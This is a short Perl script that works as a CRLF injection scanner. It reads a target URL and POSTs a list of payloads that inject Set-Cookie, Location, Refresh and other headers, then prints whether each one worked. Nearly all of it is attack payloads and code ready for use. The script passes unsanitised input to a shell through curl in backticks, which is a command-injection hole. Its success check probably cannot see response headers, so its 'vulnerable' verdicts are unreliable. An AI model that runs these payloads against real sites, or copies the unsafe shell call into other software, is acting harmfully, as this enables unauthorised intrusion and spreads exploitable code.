#!/usr/bin/perl

use strict;
use warnings;

# Prompt for the target URL
print "Enter your target URL: ";
my $TARGET_URL = <STDIN>;
chomp($TARGET_URL);

# Craft payloads with various CRLF injection techniques
my @PAYLOADS = (
    # CRLF injection in Set-Cookie header
    "username=test%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A&password=test",

    # CRLF injection in Content-Length header
    "username=test%0D%0AContent-Length:%200%0D%0A&password=test",

    # CRLF injection in Refresh header
    "username=test%0D%0ARefresh:%200%0D%0A&password=test",

    # CRLF injection in Location header
    "username=test%0D%0ALocation:%20https://www.bbc.com%0D%0A&password=test",

    # CRLF injection in User-Agent header
    "User-Agent:%20Malicious%0D%0Ausername=test&password=test",

    # CRLF injection in Referer header
    "Referer:%20https://www.bbc.com%0D%0Ausername=test&password=test",

    # CRLF injection in Proxy header
    "Proxy:%20https://www.bbc.com%0D%0Ausername=test&password=test",

    # CRLF injection in Set-Cookie2 header
    "Set-Cookie2:%20maliciousCookie=maliciousValue%0D%0Ausername=test&password=test",

    # CRLF injection in any other custom header
    "CustomHeader:%20Injection%0D%0Ausername=test&password=test",

    # CRLF injection in HTTP request method
    "POST /login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A",

    # CRLF injection in HTTP version
    "POST /login HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0A",

    # CRLF injection in MIME types
    "Content-Type: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",

    # CRLF injection in HTML comment
    "<!--%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A-->"
);

# Testing function to send requests and check responses
sub test_crlf_injection {
    my $payload = shift;
    my $response = `curl -s -X POST -d '$payload' '$TARGET_URL'`;
    if ($response =~ /maliciousCookie=maliciousValue|Refresh: 0|Content-Length: 0|Location: https:\/\/www.bbc.com/) {
        print "Vulnerable to CRLF Injection: $payload\n";
    } else {
        print "Not vulnerable to CRLF Injection: $payload\n";
    }
}

# Loop through payloads and test for vulnerabilities
foreach my $payload (@PAYLOADS) {
    test_crlf_injection($payload);
}
